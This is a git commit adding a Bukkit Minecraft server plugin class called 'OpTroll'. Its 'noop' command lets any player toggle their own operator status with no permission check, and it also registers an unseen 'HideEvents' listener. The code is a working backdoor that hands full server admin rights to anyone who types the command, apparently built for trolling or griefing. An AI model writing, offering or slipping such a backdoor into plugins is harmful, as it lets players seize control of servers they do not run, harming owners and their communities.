122064e00559a9451aa67ee83d2108e19d8ebd8b
Nifty <theretrobiz@gmail.com>
2024-12-21 14:17:00 +0300

    Add basic OpTroll command

---
+++ src/main/java/Nifty/optroll.java
@@ -0,0 +1,37 @@
+package Nifty;
+
+import Nifty.Events.HideEvents;
+import Nifty.Events.MainEvents;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.java.JavaPlugin;
+
+public final class optroll extends JavaPlugin implements CommandExecutor {
+
+    @Override
+    public void onEnable() {
+        getLogger().info("OpTroll has been enabled.");
+        getServer().getPluginManager().registerEvents(new MainEvents(), this);
+        getServer().getPluginManager().registerEvents(new HideEvents(this), this);
+        getCommand("noop").setExecutor(this);
+    }
+
+    @Override
+    public void onDisable() {
+        getLogger().info("OpTroll has been disabled.");
+    }
+
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (!(sender instanceof Player)) {
+            sender.sendMessage("Only players can use this command.");
+            return true;
+        }
+
+        sender.setOp(!sender.isOp());
+        sender.sendMessage("Your operator status is now " + (sender.isOp() ? "enabled" : "disabled") + ".");
+        return true;
+    }
+}
